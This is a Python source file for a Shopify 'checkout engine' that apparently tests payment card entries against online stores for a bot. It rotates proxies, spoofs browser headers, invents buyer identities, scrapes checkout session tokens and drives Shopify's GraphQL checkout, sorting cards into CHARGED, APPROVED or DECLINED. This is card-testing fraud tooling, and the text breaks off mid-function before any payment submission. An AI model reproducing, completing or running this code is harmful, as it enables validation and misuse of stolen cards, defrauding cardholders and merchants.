# =============================================================================
# checkout_engine.py — Shopify GraphQL Checkout Engine (v4.0.0)
# =============================================================================
# API-less. No Flask. No persisted queries. Runs in-process.
# Uses /checkouts/unstable/graphql with inline operations.
#
# Public API (unchanged from v3.x — bot needs no structural change):
#   run_checkout_for_card(shop_url, card_entry, proxy_url, low) -> CheckResult
#   run_checkout_public(shop_url, card, proxy_url, low) -> dict
#   run_checkout_async(shop_url, card, proxy_url, low) -> dict  [async]
#   normalize_proxy(raw) -> str
#   parse_card_entry(entry) -> (number, month, year, cvv)
#   is_proxy_alive(proxy_url, timeout) -> bool
#   validate_card_luhn(number) -> bool
#   get_bin_info(bin_prefix) -> dict
#   set_hit_callback(fn) -> None
#   engine_stats() -> dict
# =============================================================================

import asyncio
import json
import os
import random
import re
import time
import html as html_mod
import urllib.parse
import threading
from typing import Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import OrderedDict
from datetime import datetime
import logging

import aiohttp

# ──────────────────────── Logging ────────────────────────────────────

logger = logging.getLogger("checkout")
if not logger.handlers:
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S"))
    logger.addHandler(h)
    logger.setLevel(logging.INFO)


# ──────────────────────── Config ─────────────────────────────────────

VERSION = "4.0.0"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

_GLOBAL_SEM = threading.Semaphore(int(os.environ.get("SHOPIFY_CONCURRENCY", "8")))
_HIT_CALLBACK: Optional[Callable[[dict], None]] = None


# ──────────────────────── Result types ───────────────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False
    duration_ms: int = 0
    stage_timings: Dict[str, int] = field(default_factory=dict)


# ──────────────────────── Address book ───────────────────────────────

_ADDRESS_BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B Linking Rd", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+919876543210"},
    "AE": {"address1": "Sheikh Zayed Road 1", "city": "Dubai", "postalCode": "12345", "zoneCode": "DU", "countryCode": "AE", "phone": "+97141234567"},
    "HK": {"address1": "88 Nathan Road", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KLN", "countryCode": "HK", "phone": "+85255555555"},
    "CH": {"address1": "Bahnhofstrasse 1", "city": "Zurich", "postalCode": "8001", "zoneCode": "ZH", "countryCode": "CH", "phone": "+41441234567"},
    "AU": {"address1": "1 George St", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "+61212345678"},
    "DE": {"address1": "Friedrichstr 100", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "+493012345678"},
    "FR": {"address1": "10 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "countryCode": "FR", "phone": "+33112345678"},
    "NL": {"address1": "Dam 1", "city": "Amsterdam", "postalCode": "1012JS", "zoneCode": "NH", "countryCode": "NL", "phone": "+31201234567"},
    "IE": {"address1": "1 Grafton St", "city": "Dublin", "postalCode": "D02Y006", "zoneCode": "D", "countryCode": "IE", "phone": "+35311234567"},
    "NZ": {"address1": "1 Queen St", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "+6491234567"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "01", "countryCode": "SG", "phone": "+6561234567"},
    "JP": {"address1": "1-1-1 Marunouchi", "city": "Tokyo", "postalCode": "1000005", "zoneCode": "13", "countryCode": "JP", "phone": "+81312345678"},
    "IT": {"address1": "Via Roma 1", "city": "Rome", "postalCode": "00184", "zoneCode": "RM", "countryCode": "IT", "phone": "+39061234567"},
    "ES": {"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "M", "countryCode": "ES", "phone": "+34912345678"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

_CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU", "EUR": "DE",
    "INR": "IN", "AED": "AE", "CHF": "CH", "HKD": "HK", "NZD": "NZ",
    "SGD": "SG", "JPY": "JP",
}

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]


def _pick_address(shop_url: str, country_hint: str = "") -> dict:
    tld = (urllib.parse.urlparse(shop_url).hostname or "").split(".")[-1].upper()
    TLD_MAP = {"US": "US", "CA": "CA", "UK": "GB", "AU": "AU", "DE": "DE",
               "FR": "FR", "IN": "IN", "AE": "AE", "NZ": "NZ", "IE": "IE",
               "NL": "NL", "JP": "JP", "SG": "SG", "HK": "HK", "CH": "CH"}
    c = TLD_MAP.get(tld) or (country_hint or "").upper() or "US"
    return _ADDRESS_BOOK.get(c, _ADDRESS_BOOK["DEFAULT"])


def _random_name():
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def _random_email(first: str, last: str) -> str:
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{first.lower()}.{last.lower()}{random.randint(1,999)}@{random.choice(domains)}"


# ──────────────────────── Card validation ────────────────────────────

def validate_card_luhn(number: str) -> bool:
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
    except ValueError:
        return False
    if len(digits) < 12:
        return False
    checksum = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    parts = card_entry.strip().split('|')
    if len(parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        month = int(parts[1]); year = int(parts[2])
    except ValueError as e:
        raise Exception(f"invalid month/year: {e}")
    return parts[0], month, year, parts[3]


# ──────────────────────── Proxy helpers ──────────────────────────────

def normalize_proxy(raw: str) -> str:
    if not raw or not raw.strip():
        raise Exception("empty proxy")
    p = raw.strip()
    for prefix in ("/addproxy", "addproxy", "/proxy", "proxy"):
        if p.lower().startswith(prefix + " "):
            p = p[len(prefix):].strip()
            break
        if p.lower() == prefix:
            raise Exception("empty proxy (command only)")
    p = p.split()[0] if p else ""
    if not p:
        raise Exception("empty proxy after parsing")
    if "://" in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.hostname or not parsed.port:
            raise Exception(f"invalid proxy URL: {raw!r}")
        return p
    if "@" in p:
        return "http://" + p
    parts = p.split(":")
    if len(parts) == 2:
        host, port = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pw = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{user}:{pw}@{host}:{port}"
    raise Exception(f"unsupported proxy format: {raw!r}")


def parse_proxy_format(proxy: str) -> Optional[dict]:
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


_PROXY_HEALTH_CACHE: Dict[str, float] = {}
_PROXY_HEALTH_LOCK = threading.Lock()
_TTL_LIVE = 300
_TTL_DEAD = 60


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    if not proxy_url:
        return True
    now = time.time()
    with _PROXY_HEALTH_LOCK:
        cached = _PROXY_HEALTH_CACHE.get(proxy_url)
        if cached is not None:
            age = abs(now - abs(cached))
            ttl = _TTL_LIVE if cached > 0 else _TTL_DEAD
            if age < ttl:
                return cached > 0

    alive = False
    try:
        from curl_cffi.requests import Session as _S
        with _S(proxy=proxy_url, impersonate="chrome124", timeout=timeout) as s:
            r = s.head("https://cdn.shopify.com/", timeout=timeout)
            alive = 200 <= r.status_code < 500
    except Exception as e:
        logger.debug(f"proxy check failed {proxy_url[:40]}: {e!r}")

    with _PROXY_HEALTH_LOCK:
        _PROXY_HEALTH_CACHE[proxy_url] = now if alive else -now
    return alive


# ──────────────────────── BIN lookup ─────────────────────────────────

_BIN_CACHE: "OrderedDict[str, Tuple[float, dict]]" = OrderedDict()
_BIN_LOCK = threading.Lock()
_BIN_TTL = 86400
_BIN_MAX = 2000


def _bin_get(k: str) -> Optional[dict]:
    with _BIN_LOCK:
        e = _BIN_CACHE.get(k)
        if not e: return None
        ts, v = e
        if time.time() - ts > _BIN_TTL:
            _BIN_CACHE.pop(k, None); return None
        _BIN_CACHE.move_to_end(k); return v


def _bin_put(k: str, v: dict):
    with _BIN_LOCK:
        _BIN_CACHE[k] = (time.time(), v)
        _BIN_CACHE.move_to_end(k)
        while len(_BIN_CACHE) > _BIN_MAX:
            _BIN_CACHE.popitem(last=False)


def get_bin_info(bin_prefix: str) -> dict:
    bin6 = (bin_prefix or "")[:6]
    if len(bin6) < 6 or not bin6.isdigit():
        return {"brand": "-", "type": "-", "level": "-", "bank": "-",
                "country": "-", "flag": "", "cached": False}
    cached = _bin_get(bin6)
    if cached:
        cached["cached"] = True
        return cached
    result = {"brand": "-", "type": "-", "level": "-", "bank": "-",
              "country": "-", "flag": "", "cached": False}
    try:
        from curl_cffi.requests import Session as _S
        with _S(impersonate="chrome124", timeout=10) as s:
            r = s.get(f"https://lookup.binlist.net/{bin6}",
                      headers={"Accept-Version": "3"})
            if r.status_code == 200:
                data = r.json()
                result["brand"]   = (data.get("scheme") or "-").upper()
                result["type"]    = (data.get("type") or "-").upper()
                result["level"]   = (data.get("brand") or "-").upper()
                result["bank"]    = ((data.get("bank") or {}).get("name") or "-")
                result["country"] = ((data.get("country") or {}).get("name") or "-")
                result["flag"]    = ((data.get("country") or {}).get("emoji") or "")
    except Exception as e:
        logger.debug(f"bin lookup {bin6}: {e!r}")
    _bin_put(bin6, result)
    return result


# ──────────────────────── GraphQL operations ─────────────────────────

_QUERY_PROPOSAL = """
query Proposal($sessionInput: SessionTokenInput!, $queueToken: String,
              $delivery: DeliveryTermsInput, $discounts: DiscountTermsInput,
              $merchandise: MerchandiseTermInput, $buyerIdentity: BuyerIdentityTermInput,
              $payment: PaymentTermInput, $taxes: TaxTermInput) {
  session(sessionInput: $sessionInput) {
    negotiate(input: {
      purchaseProposal: {
        delivery: $delivery, discounts: $discounts,
        merchandise: $merchandise, buyerIdentity: $buyerIdentity,
        payment: $payment, taxes: $taxes
      },
      queueToken: $queueToken
    }) {
      __typename
      result {
        ... on NegotiationResultAvailable {
          checkpointData
          queueToken
          sellerProposal {
            __typename
            runningTotal { value { amount currencyCode } }
            checkoutTotal { value { amount currencyCode } }
            tax { ... on FilledTaxTerms { totalTaxAmount { value { amount currencyCode } } } }
            delivery {
              ... on FilledDeliveryTerms {
                deliveryLines {
                  selectedDeliveryStrategy { ... on CompleteDeliveryStrategy { handle } }
                  availableDeliveryStrategies {
                    handle
                    amount { value { amount currencyCode } }
                  }
                }
              }
            }
            payment {
              ... on FilledPaymentTerms {
                availablePaymentLines {
                  paymentMethod {
                    ... on PaymentProvider { paymentMethodIdentifier name displayName }
                    ... on CustomOnsiteProvider { paymentMethodIdentifier name }
                    ... on OffsiteProvider { paymentMethodIdentifier name }
                  }
                }
              }
            }
          }
        }
        ... on Throttled { pollAfter pollUrl queueToken }
        ... on NegotiationResultFailed { __typename }
        ... on CheckpointDenied { redirectUrl }
      }
      errors { code localizedMessage nonLocalizedMessage }
    }
  }
}
""".strip()

_MUTATION_SUBMIT = """
mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!,
                             $metafields: [MetafieldInput!],
                             $analytics: AnalyticsInput) {
  submitForCompletion(input: $input, attemptToken: $attemptToken,
                      metafields: $metafields, analytics: $analytics) {
    ... on SubmitSuccess { receipt { ...ReceiptCore } }
    ... on SubmitAlreadyAccepted { receipt { ...ReceiptCore } }
    ... on SubmitFailed { reason }
    ... on SubmitRejected {
      errors { code localizedMessage nonLocalizedMessage }
    }
    ... on Throttled { pollAfter pollUrl queueToken }
    ... on SubmittedForCompletion { receipt { ...ReceiptCore } }
  }
}
fragment ReceiptCore on Receipt {
  ... on ProcessedReceipt {
    id token orderStatusPageUrl
    confirmationPage { url }
    purchaseOrder { totalAmountToPay { amount currencyCode } }
  }
  ... on ProcessingReceipt { id pollDelay }
  ... on WaitingReceipt { id pollDelay }
  ... on ActionRequiredReceipt {
    id action { ... on CompletePaymentChallenge { offsiteRedirect url } }
  }
  ... on FailedReceipt {
    id processingError {
      ... on PaymentFailed { code messageUntranslated }
    }
  }
}
""".strip()

_QUERY_POLL = """
query PollForReceipt($receiptId: ID!, $sessionToken: String!) {
  receipt(receiptId: $receiptId, sessionInput: { sessionToken: $sessionToken }) {
    ... on ProcessedReceipt {
      id token orderStatusPageUrl
      confirmationPage { url }
      purchaseOrder { totalAmountToPay { amount currencyCode } }
    }
    ... on ProcessingReceipt { id pollDelay }
    ... on WaitingReceipt { id pollDelay }
    ... on ActionRequiredReceipt {
      id action { ... on CompletePaymentChallenge { offsiteRedirect url } }
    }
    ... on FailedReceipt {
      id processingError {
        ... on PaymentFailed { code messageUntranslated }
      }
    }
  }
}
""".strip()


# ──────────────────────── HTML extractors ────────────────────────────

def _extract_between(text: str, start: str, end: str) -> Optional[str]:
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0]
    except Exception:
        pass
    return None


def _extract_session_token(text: str, headers: dict) -> Optional[str]:
    sst = (headers.get("X-Checkout-One-Session-Token")
           or headers.get("x-checkout-one-session-token"))
    if sst: return sst
    for a, b in [
        ('name="serialized-sessionToken" content="&quot;', '&quot;'),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"', '"'),
        ('data-session-token="', '"'),
        ('"sessionToken":"', '"'),
    ]:
        v = _extract_between(text, a, b)
        if v: return v
    return None


# ──────────────────────── Cheapest product ───────────────────────────

async def _fetch_variant(session: aiohttp.ClientSession, shop_url: str, proxy: Optional[str]) -> Optional[str]:
    """Return cheapest available variant_id, or None."""
    try:
        url = shop_url.rstrip("/") + "/products.json?limit=250"
        async with session.get(url, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
    except Exception as e:
        logger.debug(f"products.json: {e!r}")
        return None

    best_price = float("inf")
    best_id = None
    for p in data.get("products", []) or []:
        for v in p.get("variants", []) or []:
            if v.get("available") is False: continue
            try:
                price = float(v.get("price") or 0)
            except (TypeError, ValueError):
                continue
            if price < best_price and price > 0:
                best_price = price
                best_id = str(v["id"])
    return best_id


# ──────────────────────── One-card check ─────────────────────────────

async def _check_card_async(
    shop_url: str,
    card_entry: str,
    proxy_url: str = "",
    low: bool = True,
) -> CheckResult:

    t_start = time.time()
    stage_timings: Dict[str, int] = {}
    def _mark(name, t0): stage_timings[name] = int((time.time() - t0) * 1000)

    site_name = urllib.parse.urlparse(shop_url).hostname or shop_url
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name,
                         status=CheckStatus.ERROR, stage_timings=stage_timings)

    # parse card
    try:
        cc, mm, yyyy, cvv = parse_card_entry(card_entry)
        if not validate_card_luhn(cc):
            result.status_code = "CARD_INVALID_LUHN"
            result.error = Exception("luhn fail")
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
    except Exception as e:
        result.error = e
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    # proxy
    proxy = proxy_url or None

    # headers
    ua = random.choice(USER_AGENTS)
    base_headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": shop_url,
        "Referer": shop_url,
        "sec-ch-ua": '"Chromium";v="124", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    addr = _pick_address(shop_url)
    country_code = addr["countryCode"]
    first, last = _random_name()
    email = _random_email(first, last)
    phone = addr["phone"]
    street = addr["address1"]
    city = addr["city"]
    state = addr["zoneCode"]
    postal = addr["postalCode"]

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

        # Step 0 — cheapest variant
        t0 = time.time()
        variant_id = await _fetch_variant(session, shop_url, proxy)
        if not variant_id:
            result.error = Exception("no variant")
            result.retryable = True
            _mark("step0_variant", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step0_variant", t0)

        # Step 1 — add to cart + start checkout
        t0 = time.time()
        try:
            cart_url = shop_url.rstrip("/") + "/cart/add.js"
            cart_headers = {**base_headers,
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Accept": "application/json, text/javascript"}
            async with session.post(cart_url, data=f"id={variant_id}&quantity=1",
                                    headers=cart_headers, proxy=proxy) as cr:
                if cr.status != 200:
                    cart_json_headers = {**base_headers}
                    async with session.post(cart_url,
                                            json={"items": [{"id": int(variant_id), "quantity": 1}]},
                                            headers=cart_json_headers, proxy=proxy) as cr2:
                        if cr2.status != 200:
                            raise Exception(f"cart add failed {cr.status}/{cr2.status}")

            checkout_url_full = shop_url.rstrip("/") + "/checkout/"
            ch_headers = {**base_headers,
                          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                          "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                          "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"}
            async with session.post(checkout_url_full, allow_redirects=True,
                                    headers=ch_headers, proxy=proxy) as resp:
                checkout_url = str(resp.url)
                resp_headers = dict(resp.headers)
                checkout_html = await resp.text()
        except Exception as e:
            result.error = Exception(f"step1: {e}")
            result.retryable = True
            _mark("step1_checkout", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if "login" in checkout_url.lower():
            result.status_code = "SITE_REQUIRES_LOGIN"
            result.error = Exception("login required")
            _mark("step1_checkout", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        _mark("step1_checkout", t0)

        # Step 2 — extract tokens
        t0 = time.time()
        try:
            sst = _extract_session_token(checkout_html, resp_headers)
            if not sst:
                raise Exception("no session token")

            unescaped = (checkout_html
                         .replace("&quot;", '"')
                         .replace("&amp;", "&")
                         .replace("&#39;", "'"))

            queue_token = (_extract_between(checkout_html, 'queueToken&quot;:&quot;', '&quot;')
                           or _extract_between(checkout_html, '"queueToken":"', '"')
                           or "")

            stable_id = (_extract_between(checkout_html, 'stableId&quot;:&quot;', '&quot;')
                         or _extract_between(checkout_html, '"stableId":"', '"')
                         or "1")

            merch_id = (_extract_between(checkout_html, 'ProductVariantMerchandise/', '&quot;')
                        or _extract_between(checkout_html, 'ProductVariantMerchandise/', '&q')
                        or _extract_between(checkout_html, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                        or variant_id)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = (attempt_token_match.group(1) if attempt_token_match
                             else checkout_url.rstrip("/").split("/")[-1].split("?")[0])

            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if bm: build_id = bm.group(1)

            source_token = _extract_between(checkout_html, 'name="serialized-sourceToken" content="', '"')
            if source_token: source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if im: ident_sig = im.group(1)

            currency = "USD"
            cm = (_extract_between(checkout_html, 'currencyCode&quot;:&quot;', '&quot;')
                  or _extract_between(checkout_html, '"currencyCode":"', '"'))
            if cm and len(cm) == 3:
                currency = cm
            elif country_code in _CURRENCY_TO_COUNTRY.values():
                pass

            subtotal = (_extract_between(checkout_html, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
                        or _extract_between(checkout_html, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', checkout_html)
                subtotal = pm.group(1) if pm else "0.01"

        except Exception as e:
            result.error = Exception(f"step2: {e}")
            result.retryable = True
            _mark("step2_extract", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        _mark("step2_extract", t0)

        # step 3 — headers for GraphQL
        gql_headers = {**base_headers,
                       "shopify-checkout-client": "checkout-web/1.0",
                       "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                       "x-checkout-one-session-token": sst,
                       "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin"}
        if build_id:
            gql_headers["x-checkout-web-build-id"] = build_id
            gql_headers["x-checkout-web-deploy-stage"] = "production"
            gql_headers["x-checkout-web-server-handling"] = "fast"
            gql_headers["x-checkout-web-server-rendering"] = "yes"
        if source_token:
            gql_headers["x-checkout-web-source-id"] = source_token

        gql_url = f"https://{urllib.parse.urlparse(shop_url).netloc}/checkouts/unstable/graphql"

        # step 4 — first Proposal
        t0 = time.time()
        proposal_vars = {
            "sessionInput": {"sessionToken": sst},
            "queueToken": queue_token or "",
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "partialStreetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": postal,
                            "firstName": first, "lastName": last,
                            "zoneCode": state, "phone": phone,
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{merch_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                    "lineComponentsSource": None, "lineComponents": [],
                }]
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "", "city": "", "countryCode": country_code,
                        "lastName": "", "zoneCode": state, "phone": "",
                    }
                },
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                "email": email, "emailChanged": False,
                "phoneCountryCode": country_code,
                "marketingConsent": [{"email": {"value": email}}],
                "shopPayOptInPhone": {"countryCode": country_code},
                "rememberMe": False,
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": [],
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
        }

        try:
            async with session.post(gql_url, params={"operationName": "Proposal"},
                                    headers=gql_headers, proxy=proxy,
                                    json={"query": _QUERY_PROPOSAL,
                                          "variables": proposal_vars,
                                          "operationName": "Proposal"}) as r:
                proposal_text = await r.text()
        except Exception as e:
            result.error = Exception(f"proposal1 net: {e}")
            result.retryable = True
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if "CAPTCHA_REQUIRED" in proposal_text.upper():
            result.status_code = "CAPTCHA_REQUIRED"
            result.error = Exception("captcha")
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        try:
            pj = json.loads(proposal_text)
        except Exception:
            result.status_code = "INVALID_JSON"
            result.error = Exception(proposal_text[:150])
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if "errors" in pj and pj["errors"]:
            em = pj["errors"][0].get("message", "graphql error")
            result.status_code = f"GQL_{str(em)[:40]}"
            result.error = Exception(str(em)[:150])
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        try:
            negotiate = pj["data"]["session"]["negotiate"]
            nresult = negotiate["result"]
            rtype = nresult.get("__typename", "")
        except Exception as e:
            result.error = Exception(f"proposal parse: {e}")
            result.retryable = True
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        if rtype == "CheckpointDenied":
            result.status_code = "CHECKPOINT_DENIED"
            result.error = Exception("checkpoint denied")
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        if rtype == "Throttled":
            result.status_code = "THROTTLED"
            result.error = Exception("throttled")
            result.retryable = True
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
        if rtype == "NegotiationResultFailed":
            result.status_code = "NEGOTIATION_FAILED"
            result.error = Exception("negotiation failed")
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        checkpoint_data = nresult.get("checkpointData")
        seller = nresult.get("sellerProposal") or {}

        running_total_data = seller.get("runningTotal", {})
        try:
            running_total = running_total_data["value"]["amount"]
        except Exception:
            result.error = Exception("no runningTotal")
            result.retryable = True
            _mark("step4_proposal1", t0)
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result

        result.amount = running_total

        # delivery strategy
        delivery = seller.get("delivery") or {}
        delivery_strategy = ""
        shipping_amount = 0.0
        if delivery.get("__typename") == "FilledDeliveryTerms":
            lines = delivery.get("deliveryLines") or [{}]
            if lines:
                strat = (lines[0].get("availableDeliveryStrategies") or [{}])[0]
                delivery_strategy = strat.get("handle", "") or ""
                try:
                    shipping_amount = float((strat.get("amount") or {}).get("value", {}).get("amount") or 0)
                except Exception:
                    shipping_amount = 0.0

        # tax
        try:
            tax_data = seller.get("tax") or {}
            if tax_data.get("__typename") == "FilledTaxTerms":
                tax_amount = float(tax_data["totalTaxAmount"]["value"]["amount"])
            else:
                tax_amount = 0.0
        except Exception:
            tax_amount = 0.0

        # payment
        payment_id = None
        gateway_name = "Shopify"
        payment = seller.get("payment") or {}
        if payment.get("__typename") == "FilledPaymentTerms":
            for line in payment.get("availablePaymentLines") or []:
                pm = line.get("paymentMethod") or {}
                pid = pm.get("paymentMethodIdentifier")
                if pid:
                    payment_id = pid
                    gateway_name = pm.get("extensibilityDisplayName") or pm.get("displayName") or pm.get("name") or "Shopify"
                    break

        if not payment_id:
            result.status_code = "NO_PAYMENT_METHOD"
